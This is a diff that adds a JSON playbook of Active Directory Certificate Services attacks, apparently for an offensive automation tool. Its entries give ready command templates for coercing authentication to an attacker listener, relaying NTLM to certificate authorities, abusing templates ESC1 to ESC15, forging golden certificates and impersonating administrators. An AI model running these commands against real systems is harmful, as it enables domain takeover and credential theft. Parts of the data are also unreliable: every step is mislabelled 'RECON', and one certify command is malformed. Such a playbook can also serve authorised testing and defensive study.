@@ -1,0 +1,462 @@
+[
+  {
+    "condition": "ADCS",
+    "attack_type": "Coerce (RPC call)",
+    "tool": "printerbug.py",
+    "req": "domain, username, password, printer_ip, listener_ip",
+    "command": "printerbug.py <domain>/<username>:<password>@<printer_ip> <listener_ip>",
+    "profit": "SMB NTLM Coerce",
+    "critical_note": "Атака PrinterBug: принуждение удаленного хоста к аутентификации на атакующем узле.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Coerce (RPC call)",
+    "tool": "petitpotam.py",
+    "req": "domain, user, password, listener_ip, target_ip",
+    "command": "petitpotam.py -d <domain> -u <user> -p <password> <listener_ip> <target_ip>",
+    "profit": "SMB NTLM Coerce",
+    "critical_note": "Атака PetitPotam: использование EFS для принудительной аутентификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Coerce (RPC call)",
+    "tool": "coercer.py",
+    "req": "domain, user, password, target, attacker_ip",
+    "command": "coercer.py -d <domain> -u <user> -p <password> -t <target> -l <attacker_ip>",
+    "profit": "SMB NTLM Coerce",
+    "critical_note": "Автоматизированный инструмент для различных методов принуждения (Coercion).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Coerce Kerberos (Step 1)",
+    "tool": "dnstool.py",
+    "req": "domain, user, password, attacker_ip, dns_server, servername",
+    "command": "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -r '<servername>' -d \"<attacker_ip>\" --action add \"<dns_server>\"",
+    "profit": "Prepare DNS",
+    "critical_note": "Подготовка DNS записи для Kerberos coercion (техники, связанные с CVE-2022-26923).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Coerce Kerberos (Step 2)",
+    "tool": "petitpotam.py",
+    "req": "user, password, domain, servername, target",
+    "command": "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>\\IUWh...' <target>",
+    "profit": "SMB Kerberos coerce",
+    "critical_note": "Исполнение атаки принуждения после подготовки DNS.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Intra ID Connect",
+    "tool": "nxc ldap",
+    "req": "dc_ip, user, password",
+    "command": "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users | grep -i MSOL",
+    "profit": "Find MSOL",
+    "critical_note": "Поиск учетных записей MSOL через описание пользователей.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certutil",
+    "req": "joined_host",
+    "command": "certutil -v -dsTemplate",
+    "profit": "List Templates",
+    "critical_note": "Получение списка шаблонов сертификатов через встроенную утилиту Windows.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certify.exe",
+    "req": "joined_host",
+    "command": "certify.exe find /vulnerable",
+    "profit": "Find Vulnerabilities",
+    "critical_note": "Поиск уязвимых шаблонов с помощью Certify.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certipy",
+    "req": "user, domain, password, dc_ip",
+    "command": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable",
+    "profit": "Find Vulnerabilities",
+    "critical_note": "Поиск уязвимостей ADCS удаленно через Certipy.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "ldeep",
+    "req": "user, password, domain, dc_ip",
+    "command": "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
+    "profit": "List Templates LDAP",
+    "critical_note": "Перечисление шаблонов через LDAP.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certify.exe",
+    "req": "joined_host",
+    "command": "certify.exe pkiobjects",
+    "profit": "Get PKI Objects",
+    "critical_note": "Получение информации об объектах PKI.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certutil",
+    "req": "joined_host",
+    "command": "certutil -TCAInfo",
+    "profit": "Display CA Info",
+    "critical_note": "Отображение информации о центрах сертификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Enumeration",
+    "tool": "certify.exe",
+    "req": "joined_host",
+    "command": "certify.exe cas",
+    "profit": "Display CA Info",
+    "critical_note": "Отображение информации о CA через Certify.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Web Enrollment (ESC8)",
+    "tool": "ntlmrelayx.py",
+    "req": "dc_ip",
+    "command": "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
+    "profit": "Relay to CA",
+    "critical_note": "Атака NTLM Relay на HTTP-интерфейс ADCS (ESC8).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Web Enrollment (ESC8)",
+    "tool": "certipy",
+    "req": "ca_ip",
+    "command": "certipy relay -target http://<ip_ca>",
+    "profit": "Relay Listener",
+    "critical_note": "Подготовка листенера Certipy для атаки ESC8.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC11 (Relay to RPC)",
+    "tool": "ntlmrelayx.py",
+    "req": "ca_ip, ca_name",
+    "command": "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
+    "profit": "Relay to RPC CA",
+    "critical_note": "Атака ESC11: NTLM Relay на RPC-интерфейс центра сертификации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC11 (Relay to RPC)",
+    "tool": "certipy",
+    "req": "ip_ca, ca_name",
+    "command": "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
+    "profit": "Relay Listener",
+    "critical_note": "Подготовка листенера Certipy для атаки ESC11 (RPC Relay).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Auth & PTT",
+    "tool": "certipy",
+    "req": "certificate, dc_ip",
+    "command": "certipy auth -pfx <certificate> -dc-ip <dc_ip>",
+    "profit": "Get NT Hash/TGT",
+    "critical_note": "Аутентификация с сертификатом для получения TGT/NTHash.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Post-Exploitation",
+    "tool": "Rubeus.exe",
+    "req": "user, certificate_b64",
+    "command": "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
+    "profit": "Pass The Ticket",
+    "critical_note": "Получение TGT (Pass-the-Ticket) через Rubeus с использованием сертификата.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Post-Exploitation",
+    "tool": "gettgtpkinit.py",
+    "req": "certificate_b64, domain, dc_name, ccache_file",
+    "command": "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
+    "profit": "Get TGT (PKINIT)",
+    "critical_note": "Получение TGT через PKINIT (Impacket).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC1",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name, target_user",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template <vulnerable_template_name> -ca <ca_name> -upn <target_user>@<domain>",
+    "profit": "Get Administrator Cert",
+    "critical_note": "Эксплуатация ESC1: запрос сертификата с подменой UPN (SAN).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC1",
+    "tool": "certify.exe",
+    "req": "ca_server, ca_name, template",
+    "command": "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\" /altname:\"Admin\"",
+    "profit": "Get Administrator Cert",
+    "critical_note": "Эксплуатация ESC1 через Certify.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC6",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name, target_user",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template <any_client_auth_template> -ca <ca_name> -upn <target_user>@<domain>",
+    "profit": "Get Administrator Cert",
+    "critical_note": "Эксплуатация ESC6: Abuse EDITF_ATTRIBUTESUBJECTALTNAME2. Используется синтаксис ESC1, но работает на любом шаблоне с Client Auth.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC3 (Step 1)",
+    "tool": "certify.exe",
+    "req": "ca_server, ca_name, template, user",
+    "command": "certify.exe request request /ca:<server>\\<ca-name> /template:<template> /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> /enrollcertpw:<cert-password>]",
+    "profit": "Request Agent Cert",
+    "critical_note": "ESC3 Шаг 1: Получение сертификата Enrollment Agent.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC3 (Step 1)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>",
+    "profit": "Request Agent Cert",
+    "critical_note": "ESC3 Шаг 1 через Certipy.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC3 (Step 2)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name, target_user, pfx_cert",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
+    "profit": "Pass The Certificate",
+    "critical_note": "ESC3 Шаг 2: Выпуск сертификата жертвы с использованием сертификата агента.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC13",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name>",
+    "profit": "Get Cert with Policy",
+    "critical_note": "Эксплуатация ESC13 (Issuance Policies).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC13",
+    "tool": "certify.exe",
+    "req": "ca_server, ca_name, template",
+    "command": "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"",
+    "profit": "Get Cert with Policy",
+    "critical_note": "Эксплуатация ESC13 через Certify.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC15",
+    "tool": "certipy",
+    "req": "user, password, domain, target_user, ca_name, version_1_template",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template 'version 1 template with enrolee flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]",
+    "profit": "V1 Template Abuse",
+    "critical_note": "Атака ESC15 на шаблоны версии 1 (Client Auth).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC15",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template 'version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' #[PR 228]",
+    "profit": "V1 Template Abuse",
+    "critical_note": "Атака ESC15 на шаблоны версии 1 (Request Agent).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC15 (Step 2)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_server, template, ca_name, pfx_cert",
+    "command": "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>",
+    "profit": "Pass The Certificate",
+    "critical_note": "Финальный шаг ESC15.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC4",
+    "tool": "certipy",
+    "req": "user, password, domain, template",
+    "command": "certipy template -u <user>@<domain> -p <password> -template <vuln_template> -save-old -debug",
+    "profit": "Write Privilege",
+    "critical_note": "ESC4: Изменение шаблона сертификата (ACL Abuse).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC4 (Restore)",
+    "tool": "certipy",
+    "req": "user, password, domain, template, json_config",
+    "command": "certipy template -u <user>@<domain> -p <password> -template <vuln_template> -configuration <template>.json",
+    "profit": "Restore Template",
+    "critical_note": "Восстановление конфигурации шаблона после ESC4.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC5 (Backup CA)",
+    "tool": "certipy",
+    "req": "user, domain, hash_nt, ca_name, ca_ip",
+    "command": "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
+    "profit": "Golden Certificate",
+    "critical_note": "ESC5: Бэкап CA для извлечения закрытого ключа (Vulnerable PKI Object ACL).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC5 (Forge)",
+    "tool": "certipy",
+    "req": "adcs_pfx, domain",
+    "command": "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>",
+    "profit": "Pass the certificate",
+    "critical_note": "ESC5: Подделка (Forge) золотого сертификата используя извлеченный ключ CA.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC7 (Step 1)",
+    "tool": "certipy",
+    "req": "ca_name, user, password, domain, dc_ip, target_ip",
+    "command": "certipy ca -ca <ca_name> -add-officer <user> -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>",
+    "profit": "Manage CA",
+    "critical_note": "ESC7: Добавление пользователя в роль Officer.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC7 (Step 2)",
+    "tool": "certipy",
+    "req": "ca_name, user, password, domain",
+    "command": "certipy ca -ca <ca_name> -enable-template '<ecs1_vuln_template>' -username <user>@<domain> -password <password>",
+    "profit": "Manage Certificate",
+    "critical_note": "ESC7: Включение уязвимого шаблона.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC7 (Step 3)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_name, target_user",
+    "command": "certipy req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable template name>' -upn <target_user>",
+    "profit": "Issue Request",
+    "critical_note": "ESC7: Запрос сертификата (в ожидании одобрения).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC7 (Step 4)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_name, request_id",
+    "command": "certipy ca -u <user>@<domain> -p <password> -ca <ca_name> -issue-request <request_id>",
+    "profit": "Approve Request",
+    "critical_note": "ESC7: Одобрение выдачи сертификата.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC7 (Step 5)",
+    "tool": "certipy",
+    "req": "user, password, domain, ca_name, request_id",
+    "command": "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -retrieve <request_id>",
+    "profit": "Retrieve Certificate",
+    "critical_note": "ESC7: Скачивание одобренного сертификата.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC9/ESC10 (Implicit)",
+    "tool": "certipy",
+    "req": "accountA, domain, passA, accountB",
+    "command": "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
+    "profit": "Shadow Credentials",
+    "critical_note": "Эксплуатация Shadow Credentials.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "Certificate Mapping",
+    "tool": "certipy",
+    "req": "accountA, domain, passA, accountB, target_upn",
+    "command": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>",
+    "profit": "Reset UPN",
+    "critical_note": "Сброс UPN пользователя перед атакой.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC9/ESC10 (Case 1)",
+    "tool": "certipy",
+    "req": "accountA, domain, passA, accountB",
+    "command": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator",
+    "profit": "Kerberos Mapping",
+    "critical_note": "ESC9/10: Подмена UPN на Administrator.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC10 (Case 2)",
+    "tool": "certipy",
+    "req": "accountA, domain, passA, accountB, dc_name",
+    "command": "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name>$@<domain>'",
+    "profit": "Schannel Mapping",
+    "critical_note": "ESC10: Подмена UPN на имя DC для Schannel Mapping.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC9",
+    "tool": "certipy",
+    "req": "accountB, domain, hashB, ca_name",
+    "command": "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>",
+    "profit": "Get Certificate",
+    "critical_note": "Запрос сертификата для ESC9.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "ADCS",
+    "attack_type": "ESC10",
+    "tool": "certipy",
+    "req": "accountB, domain, hashB, ca_name",
+    "command": "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>",
+    "profit": "Get Certificate",
+    "critical_note": "Запрос сертификата для ESC10.",
+    "kill_chain_phase": "RECON"
+  }
+]
